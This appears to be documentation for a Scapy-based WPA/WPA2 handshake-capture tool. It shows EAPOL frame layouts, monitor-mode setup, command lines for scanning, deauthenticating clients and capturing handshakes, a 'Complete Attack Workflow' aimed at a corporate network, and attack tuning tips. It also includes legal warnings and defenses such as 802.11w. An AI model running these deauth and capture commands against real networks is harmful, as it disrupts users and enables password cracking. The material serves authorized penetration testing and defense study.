## EAPOL Frame Structure

### EAPOL Header
```
0                   1                   2                   3
0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|  Version   | Packet Type |         Body Length              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

### EAPOL-Key Frame
```
0                   1                   2                   3
0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| Descriptor Type |  Key Info    |   Key Length  |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                          Replay Counter                         |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                           Key Nonce                             |
|                              ...                                |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                             Key IV                              |
|                              ...                                |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                            Key RSC                              |
|                              ...                                |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                            Key ID                               |
|                              ...                                |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                             Key MIC                             |
|                              ...                                |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                         Key Data Length                         |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                            Key Data                             |
|                              ...                                |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

## Installation

### Dependencies
```bash
# Install required packages
pip install scapy

# Optional - for enhanced functionality
pip install colorama tqdm pyric

# On Debian/Ubuntu
sudo apt install python3-scapy python3-colorama python3-tqdm python3-pyric

# Install aircrack-ng for verification
sudo apt install aircrack-ng
```

### Root Privileges
```bash
# Script requires root for packet injection
sudo python3 wpa_handshake.py [options]
```

### Enable Monitor Mode
```bash
# Using airmon-ng
sudo airmon-ng start wlan0
# Interface becomes wlan0mon

# Or let the script handle it
sudo python3 wpa_handshake.py --interface wlan0 --enable-monitor --scan
```

## Usage Examples

### Network Scanning
```bash
# Scan for networks
sudo python3 wpa_handshake.py --interface wlan0mon --scan

# Scan and automatically capture
sudo python3 wpa_handshake.py --interface wlan0mon --scan --capture --essid "MyWiFi"
```

### Targeted Handshake Capture
```bash
# Capture handshake from specific AP
sudo python3 wpa_handshake.py --interface wlan0mon --bssid 00:11:22:33:44:55 --channel 6 --output handshake.pcap

# With deauth to force reconnection
sudo python3 wpa_handshake.py --interface wlan0mon --bssid 00:11:22:33:44:55 --deauth-count 10 --deauth-delay 0.5
```

### Automated Mode
```bash
# Interactive target selection
sudo python3 wpa_handshake.py --interface wlan0mon --auto

# With custom timeout
sudo python3 wpa_handshake.py --interface wlan0mon --auto --timeout 120
```

### Complete Attack Workflow
```bash
# Full attack chain
sudo python3 wpa_handshake.py \
  --interface wlan0 \
  --enable-monitor \
  --scan \
  --capture \
  --essid "CorporateWiFi" \
  --channel 11 \
  --deauth-count 10 \
  --timeout 120 \
  --output corporate_handshake.pcap \
  --verbose \
  --disable-monitor
```

## Handshake Verification

### Using aircrack-ng
```bash
# Verify captured handshake
aircrack-ng handshake.pcap

# Look for "1 handshake" in output
```

### Using tshark
```bash
# Display EAPOL frames
tshark -r handshake.pcap -Y "eapol"
```

## Security Considerations

⚠️ **IMPORTANT LEGAL AND ETHICAL NOTES:**

1. **Authorization Required**: This tool is for authorized penetration testing only. Unauthorized use violates computer fraud laws and telecommunications regulations.

2. **Network Disruption**: Deauth attacks:
   - Disconnect legitimate users
   - Can cause service denial
   - May trigger intrusion detection

3. **Legal Consequences**: Unauthorized Wi-Fi attacks are illegal in most countries.

4. **Responsible Use**: Only test networks you own or have written permission to test.

## Detection and Prevention

### For Network Defenders:

1. **Enable 802.11w (Management Frame Protection)**:
   ```
   # On enterprise APs
   Configure "Protected Management Frames" = Required
   ```

2. **Use WIDS/WIPS**:
   ```bash
   # Example: Kismet for detection
   sudo kismet -c wlan0mon
   ```

3. **Monitor for Deauth Floods**:
   ```bash
   # Detect excessive deauth frames
   tcpdump -i wlan0mon -n 'type mgt subtype deauth'
   ```

4. **Enable PMF (Protected Management Frames)**:
   ```
   hostapd.conf:
   ieee80211w=2
   wpa_key_mgmt=WPA-PSK-SHA256
   ```

### Signs of Attack:
- Frequent disconnections
- Deauth frames from unknown source
- High rate of deauth packets
- Clients constantly reconnecting
- EAPOL frames without prior association

## Troubleshooting

| Issue | Solution |
|-------|----------|
| "No such device" | Check interface exists with `iwconfig` |
| Not in monitor mode | Use `--enable-monitor` or airmon-ng |
| Permission denied | Run with sudo |
| No handshake captured | Increase timeout, send more deauth |
| Only partial handshake | Ensure all 4 messages captured |
| EAPOL frames not seen | Check channel, proximity to target |

## Handshake Analysis

### Message 1 (ANonce)
```
Key Info: 0x0080 (ACK)
- Indicates AP is ready
- Contains random ANonce
- No MIC present
```

### Message 2 (SNonce + MIC)
```
Key Info: 0x010A (MIC, Secure, Pairwise)
- Client responds with SNonce
- MIC protects message
- PTK can now be derived
```

### Message 3 (Install PTK)
```
Key Info: 0x13CA (MIC, Secure, Install, Pairwise)
- AP installs PTK
- Contains encrypted GTK
- Confirms handshake
```

### Message 4 (Confirm)
```
Key Info: 0x030A (MIC, Secure, Pairwise)
- Client confirms completion
- Minimal frame (no key data)
- Handshake complete
```

## Performance Tips

- **Channel**: Ensure you're on correct channel
- **Distance**: Stay within 50-100 meters of target
- **Timing**: Send deauth right before expected reconnection
- **Patience**: May take multiple attempts
- **Clients**: Target active clients (high traffic)

## Limitations

- Requires proximity to target
- Does not work on 802.11w protected networks
- Some clients ignore deauth frames
- WPA3 not supported
- Cannot capture PMKID (different frame type)

## Educational Use

This tool is excellent for learning about:
- 802.11 authentication process
- WPA/WPA2 4-way handshake
- EAPOL protocol analysis
- Wireless penetration testing
- Cryptographic key exchange

## Defense Lab Exercise

To test defenses:
1. Set up AP with WPA2-PSK
2. Enable 802.11w if supported
3. Attempt handshake capture
4. Observe protection mechanisms
5. Document findings and mitigations
